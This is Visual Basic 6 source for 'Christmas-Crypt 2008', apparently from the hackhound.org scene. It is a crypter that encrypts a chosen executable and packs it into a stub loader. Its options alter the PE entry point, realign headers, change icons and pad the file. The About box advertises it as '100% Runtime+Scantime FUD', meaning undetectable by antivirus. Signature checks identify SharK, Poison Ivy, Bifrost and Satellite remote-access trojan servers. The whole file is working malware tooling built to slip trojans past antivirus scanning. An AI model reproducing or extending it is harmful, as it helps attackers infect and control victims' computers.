VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form1 
   BorderStyle     =   4  'Festes Werkzeugfenster
   Caption         =   "Christmas-Crypt 2008 by Ner0"
   ClientHeight    =   5190
   ClientLeft      =   5160
   ClientTop       =   3795
   ClientWidth     =   5760
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5190
   ScaleWidth      =   5760
   ShowInTaskbar   =   0   'False
   Begin VB.CommandButton Command3 
      Caption         =   "Browse Icon"
      Enabled         =   0   'False
      Height          =   255
      Left            =   0
      TabIndex        =   9
      Top             =   1680
      Width           =   5775
   End
   Begin VB.Frame Frame1 
      Height          =   3015
      Left            =   120
      TabIndex        =   4
      Top             =   2040
      Width           =   5535
      Begin VB.Frame Frame2 
         Caption         =   "Options"
         Height          =   1455
         Left            =   3240
         TabIndex        =   13
         Top             =   1440
         Width           =   2175
         Begin VB.CheckBox Check1 
            Caption         =   "Change PE Entrypoint"
            ForeColor       =   &H00000000&
            Height          =   195
            Left            =   120
            TabIndex        =   18
            Top             =   720
            Width           =   1935
         End
         Begin VB.CheckBox Check6 
            Caption         =   "Enable Icon Changer"
            Height          =   195
            Left            =   120
            TabIndex        =   17
            Top             =   480
            Width           =   1815
         End
         Begin VB.CheckBox Check5 
            Caption         =   "Enable Exe Pump"
            Height          =   195
            Left            =   120
            TabIndex        =   16
            Top             =   240
            Width           =   1575
         End
         Begin VB.CheckBox Check3 
            Caption         =   "EOF Support"
            Height          =   195
            Left            =   120
            TabIndex        =   15
            Top             =   1200
            Width           =   1215
         End
         Begin VB.CheckBox Check2 
            Caption         =   "Realign PE Header"
            ForeColor       =   &H00000000&
            Height          =   195
            Left            =   120
            TabIndex        =   14
            Top             =   960
            Width           =   1695
         End
      End
      Begin VB.TextBox Text2 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   10
         Text            =   "0"
         Top             =   2040
         Width           =   1695
      End
      Begin VB.TextBox Text1 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   8
         Top             =   1080
         Width           =   5295
      End
      Begin VB.TextBox txtFile 
         Height          =   285
         Left            =   120
         TabIndex        =   5
         Top             =   480
         Width           =   5295
      End
      Begin MSComDlg.CommonDialog ComDlg 
         Left            =   2520
         Top             =   2400
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
      End
      Begin VB.Label Label1h 
         AutoSize        =   -1  'True
         Caption         =   "1024 KB ~ 1 MB"
         Height          =   195
         Left            =   480
         TabIndex        =   19
         Top             =   2520
         Width           =   1185
      End
      Begin VB.Image Image1k 
         Height          =   240
         Left            =   120
         Picture         =   "Form1.frx":0000
         Top             =   2520
         Width           =   240
      End
      Begin VB.Label Label4 
         AutoSize        =   -1  'True
         Caption         =   "Exe Pump :"
         Height          =   195
         Left            =   120
         TabIndex        =   12
         Top             =   1680
         Width           =   810
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "Kilo Bytes"
         Height          =   195
         Left            =   2040
         TabIndex        =   11
         Top             =   2040
         Width           =   690
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         Caption         =   "Icon Changer :"
         Height          =   195
         Left            =   120
         TabIndex        =   7
         Top             =   840
         Width           =   1050
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         Caption         =   "File :"
         Height          =   195
         Left            =   120
         TabIndex        =   6
         Top             =   240
         Width           =   330
      End
   End
   Begin VB.CommandButton Command2 
      Caption         =   "About"
      Height          =   255
      Left            =   4320
      TabIndex        =   3
      Top             =   1440
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Exit"
      Height          =   255
      Left            =   2880
      TabIndex        =   2
      Top             =   1440
      Width           =   1455
   End
   Begin VB.CommandButton cmdCrypt 
      Caption         =   "Crypt"
      Height          =   255
      Left            =   1440
      TabIndex        =   1
      Top             =   1440
      Width           =   1455
   End
   Begin VB.CommandButton cmdBrowse 
      Caption         =   "Browse"
      Height          =   255
      Left            =   0
      TabIndex        =   0
      Top             =   1440
      Width           =   1455
   End
   Begin VB.Image Image1 
      Height          =   1500
      Left            =   0
      Picture         =   "Form1.frx":058A
      Top             =   0
      Width           =   6000
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const FileEnde = "##<>()&abcdefg&()<>##"
Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
    Dim sFileBuf As String, sEOFBuf As String, sChar As String
    Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
    If Dir(sFilePath) = "" Then GoTo Err:
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
    lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
    sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
    ReadEOFData = StrReverse(sEOFBuf)
    If ReadEOFData = "" Then
    MsgBox "Datei besitzt keine EOF Daten!", vbInformation, "Kein EOF"
    End If
    Exit Function
Err:
    ReadEOFData = vbNullString
End Function
Sub WriteEOFData(sFilePath As String, sEOFData As String)
    Dim sFileBuf As String
    Dim lFF As Long
    On Error Resume Next
    If Dir(sFilePath) = "" Then Exit Sub
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        sFileBuf = Space(LOF(lFF))
        Get #lFF, , sFileBuf
    Close #lFF
    Kill sFilePath
    lFF = FreeFile
    Open sFilePath For Binary As #lFF
        Put #lFF, , sFileBuf & sEOFData
    Close #lFF
End Sub
Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function
Private Sub Check5_Click()
If Check5.Value = 1 Then
Text2.Enabled = True
Else
Text2.Enabled = False
End If
End Sub
Private Sub Check6_Click()
If Check6.Value = 1 Then
Text1.Enabled = True
Command3.Enabled = True
Else
Text1.Enabled = False
Command3.Enabled = False
End If
End Sub
Private Sub cmdBrowse_Click()
ComDlg.CancelError = False
ComDlg.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
ComDlg.ShowOpen
txtFile.Text = ComDlg.Filename
FileInfo (txtFile.Text)
End Sub
Private Sub cmdCrypt_Click()
Dim c  As New clscrypt
Dim Data As String
Dim Stub As String
Dim pump As String
Dim kbstring As String
Dim eofdata As String
Dim i As Integer
If ComDlg.Filename = "" Then
MsgBox "Please select a File!", vbInformation, "Info"
Exit Sub
End If
ComDlg.CancelError = False
ComDlg.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
ComDlg.Filename = ""
ComDlg.ShowSave
If Check3.Value = True Then
eofdata = ReadEOFData(txtFile.Text)
Else
End If
Open txtFile.Text For Binary As #1
Data = Space(LOF(1))
Get #1, , Data
Close #1
Open App.Path & "\stub.exe" For Binary As #1
Stub = Space(LOF(1))
Get #1, , Stub
Close #1
Open ComDlg.Filename For Binary As #1
Put #1, , Stub + FileEnde
Put #1, , c.EncryptString(Data)
Close #1
If Check3.Value = True Then
Call WriteEOFData(ComDlg.Filename, eofdata)
End If
Call RealignPEFromFile(ComDlg.Filename)
If Check1.Value = True Then
Call ChangeOEPFromFile(ComDlg.Filename)
End If
If Check2.Value = True Then
Call RealignPEFromFile(ComDlg.Filename)
End If
If Check6.Value = True Then
Call ReplaceIcons(ComDlg.Filename, Text1.Text, Err)
End If
If Check5.Value = True Then
kbstring = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         "
For i = 0 To Text2.Text
pump = pump & kbstring
Next i
Put #1, Len(sBuff) + 1, pump
Close #1
End If
MsgBox "Finish!", vbInformation, "Info"
End Sub
Private Sub Command1_Click()
End
End Sub
Private Sub Command2_Click()
MsgBox "Greetz to:" & vbNewLine & "Ryan" & ", Exydos" & vbNewLine & "Special Thanks to Cobein for Release of the Great Functions!" & vbNewLine & "The other Friends" & vbNewLine & "Codet for Hackhound.org (Coder Contest)" & vbNewLine & "Visit: www.hackhound.org" & vbNewLine & "Compiler: VB6" & vbNewLine & "Info: 100% Runtime+Scantime FUD" & vbNewLine & "Coder: Ner0", vbInformation, "Info"
End Sub
Private Sub Command3_Click()
ComDlg.CancelError = False
ComDlg.Filter = "Icons (*.ico)|*.ico"
ComDlg.Filename = ""
ComDlg.ShowOpen
Text1.Text = ComDlg.Filename
End Sub
Function FileInfo(ByVal FFile As String)
Dim ForSize As String
Dim sstub As String
Dim hallo As String
Dim proz As Integer
Dim Finfo(0 To 100) As Double
Dim ff As Integer
ff = FreeFile
Open FFile For Binary As #ff
    ForSize = Space$(LOF(ff))
    Get #ff, , ForSize
Close #ff
Open App.Path & "\stub.exe" For Binary As #ff
sstub = Space(LOF(ff))
Get #ff, , sstub
Close #ff
Finfo(0) = InStr(ForSize, "s3|Fs|gFs[N;sÛœHsÄ¨Hs ÁGsGÂGscGsÄåFsÜŽ;sãÒGs]ðHsT&Gs½;GsibGsn‚;s`Gs™W;s;fGsž8Gs|æFsDQ;sgéFs>Þ9s<”HsÈFsSH;sñI;")
Finfo(1) = InStr(ForSize, "sharK 3")
Finfo(2) = InStr(ForSize, "½ËÚùn¥‰ùn¥‰ùn¥‰wq¶‰ýn¥‰N·‰øn¥‰Richùn¥‰")
Finfo(3) = InStr(ForSize, "ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØûûüÒöööööööÛí!")
Finfo(4) = InStr(ForSize, "233$363S34N5p5Ç5Ó5Ú5ì5þ5\6²6â6ý67")
If Finfo(0) <> 0 Then
MsgBox "Selected File is a SharK 2 Server!", vbInformation, "Info"
SharK2 = True
End If
If Finfo(1) <> 0 Then
MsgBox "Selected File is a SharK 3 Server!", vbInformation, "Info"
SharK3 = True
End If
If Finfo(2) <> 0 Then
MsgBox "Selected File is a Poisen Ivy Server!", vbInformation, "Info"
PI = True
End If
If Finfo(3) <> 0 Then
MsgBox "Selected File is a Bifrost Server!", vbInformation, "Info"
Bifrost = True
End If
If Finfo(4) <> 0 Then
MsgBox "Selected File is a Satelite 4600 Server!", vbInformation, "Info"
Bifrost = True
End If
End Function
